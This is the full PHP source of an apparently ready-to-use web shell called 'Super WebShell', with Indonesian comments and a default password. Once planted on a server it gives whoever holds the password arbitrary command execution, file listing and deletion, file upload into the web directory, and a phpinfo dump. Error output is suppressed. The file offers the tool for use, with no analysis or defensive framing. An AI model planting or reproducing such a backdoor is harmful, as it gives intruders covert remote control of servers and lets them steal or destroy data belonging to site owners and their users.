<?php
// ================================================================
// SUPER WEBSHELL - All-in-One (FIXED)
// ================================================================

error_reporting(0);
ini_set('display_errors', 0);

// ========== AUTH (Password dari file) ==========
$password_file = 'password.hash';
if (file_exists($password_file)) {
    $expected_hash = trim(file_get_contents($password_file));
} else {
    $expected_hash = md5('apip'); // default
}

if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== $expected_hash) {
    if (isset($_POST['pass']) && md5($_POST['pass']) === $expected_hash) {
        setcookie('auth', $expected_hash, time()+3600*24*30, '/');
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    echo '<form method=POST><input type=password name=pass placeholder="Password"><input type=submit value="Login"></form>';
    exit;
}

// ========== FUNGSI ==========
function execute($cmd) {
    if (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); }
    elseif (function_exists('exec')) { $out = []; exec($cmd, $out); return implode("\n", $out); }
    elseif (function_exists('shell_exec')) { return shell_exec($cmd); }
    elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); }
    else { return "No execution function available"; }
}

function file_manager($path = '.') {
    $dir = realpath($path);
    if (!$dir || !is_dir($dir)) return "Invalid directory";
    $files = scandir($dir);
    $html = "<h3>📁 " . htmlspecialchars($dir) . "</h3><ul>";
    foreach ($files as $f) {
        $full = $dir . DIRECTORY_SEPARATOR . $f;
        $type = is_dir($full) ? '📁' : '📄';
        $size = is_file($full) ? number_format(filesize($full)) . ' bytes' : '-';
        $perm = substr(sprintf('%o', fileperms($full)), -4);
        $html .= "<li>$type $f - $size - $perm</li>";
    }
    $html .= "</ul>";
    return $html;
}

// ========== ROUTER ==========
$action = isset($_GET['a']) ? $_GET['a'] : 'home';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Super WebShell</title>
    <style>
        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
        .menu { background: #222; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .menu a { color: #0f0; text-decoration: none; margin-right: 15px; }
        .menu a:hover { text-decoration: underline; }
        .container { background: #1a1a1a; padding: 20px; border-radius: 5px; border: 1px solid #0f0; }
        input, textarea { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; }
        input[type=submit] { background: #0f0; color: #000; cursor: pointer; }
        .output { background: #000; padding: 10px; border-radius: 3px; white-space: pre-wrap; }
        .file-list { list-style: none; padding: 0; }
        .file-list li { padding: 5px; border-bottom: 1px solid #333; }
    </style>
</head>
<body>
<div class="menu">
    <a href="?a=home">🏠 Home</a>
    <a href="?a=cmd">💻 CMD</a>
    <a href="?a=files">📁 Files</a>
    <a href="?a=upload">📤 Upload</a>
    <a href="?a=db">🗄️ DB</a>
    <a href="?a=info">ℹ️ Info</a>
    <a href="?a=logout">🚪 Logout</a>
</div>
<div class="container">
<?php
switch($action) {
    case 'home':
        echo "<h2>🔥 Super WebShell - Ready</h2>";
        echo "<p>Server: " . php_uname() . "</p>";
        echo "<p>PHP: " . phpversion() . "</p>";
        echo "<p>User: " . get_current_user() . "</p>";
        break;

    case 'cmd':
        echo "<h2>💻 Command Execution</h2>";
        echo '<form method=GET><input type=hidden name=a value=cmd><input type=text name=cmd placeholder="Command" style="width:70%"><input type=submit value="Run"></form>';
        if (isset($_GET['cmd'])) {
            echo '<div class="output">' . htmlspecialchars(execute($_GET['cmd'])) . '</div>';
        }
        break;

    case 'files':
        $path = isset($_GET['path']) ? $_GET['path'] : '.';
        echo file_manager($path);
        if (isset($_GET['delete'])) {
            if (unlink($_GET['delete'])) {
                echo "<p>✅ Deleted: " . htmlspecialchars($_GET['delete']) . "</p>";
            } else {
                echo "<p>❌ Failed to delete: " . htmlspecialchars($_GET['delete']) . "</p>";
            }
        }
        break;

    case 'upload':
        echo "<h2>📤 Upload File</h2>";
        echo '<form method=POST enctype="multipart/form-data"><input type=file name=file><input type=submit value=Upload></form>';
        if (isset($_FILES['file'])) {
            $target = basename($_FILES['file']['name']);
            if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                echo "<p>✅ Uploaded: " . htmlspecialchars($target) . "</p>";
            } else {
                echo "<p>❌ Upload failed.</p>";
            }
        }
        break;

    case 'db':
        echo "<h2>🗄️ Database Manager</h2>";
        echo '<form method=POST><textarea name=sql rows=5 cols=60 placeholder="SQL Query"></textarea><br><input type=submit value="Execute"></form>';
        if (isset($_POST['sql'])) {
            try {
                $db = new SQLite3(':memory:');
                $result = $db->query($_POST['sql']);
                echo "<pre>Query executed successfully.</pre>";
            } catch (Exception $e) {
                echo "<pre>Error: " . htmlspecialchars($e->getMessage()) . "</pre>";
            }
        }
        break;

    case 'info':
        echo "<h2>ℹ️ System Info</h2>";
        phpinfo();
        break;

    case 'logout':
        setcookie('auth', '', time()-3600, '/');
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;

    default:
        echo "<h2>Invalid action</h2>";
}
?>
</div>
</body>
</html>